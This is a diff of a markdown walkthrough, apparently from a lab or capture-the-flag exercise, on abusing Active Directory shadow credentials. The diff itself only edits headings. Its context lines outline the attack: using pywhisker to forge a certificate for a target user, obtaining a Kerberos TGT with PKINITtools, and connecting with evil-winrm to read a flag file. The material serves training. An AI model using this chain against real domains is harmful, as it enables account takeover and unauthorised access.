@@ -4,7 +4,7 @@
 
 ---
 
-## TL;DR Flow
+## Flow
 1) **Clone pywhisker** and generate `.pfx` for target user.  
 2) **Use PKINITtools** to obtain Kerberos TGT (`gettgtpkinit.py`).  
 3) **Export ccache** and configure `/etc/krb5.conf` + `/etc/hosts`.  
@@ -22,7 +22,7 @@ References: pywhisker, PKINITtools, oscrypto, evil-winrm.
 
 ---
 
-## Shadow Cred Abuse → Generate Certificate
+## Shadow Cred Abuse Generate Certificate
 ### pywhisker
 ```bash
 git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker
@@ -35,7 +35,7 @@ Output gives `.pfx` file and password (e.g., `1UCYb0YS.pfx` + `1P9EvC2tKKJlBSum4
 
 ---
 
-## Convert Certificate → Kerberos TGT
+## Convert Certificate Kerberos TGT
 ### PKINITtools
 ```bash
 cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
@@ -86,7 +86,7 @@ type C:\Users\jpinkman\Desktop\flag.txt
 
 ---
 
-## Quick Reference — Commands
+## Quick Reference
 ```bash
 # Shadow cred
 python3 pywhisker.py --dc-ip DC_IP -d DOMAIN.LOCAL -u attacker -p pass \
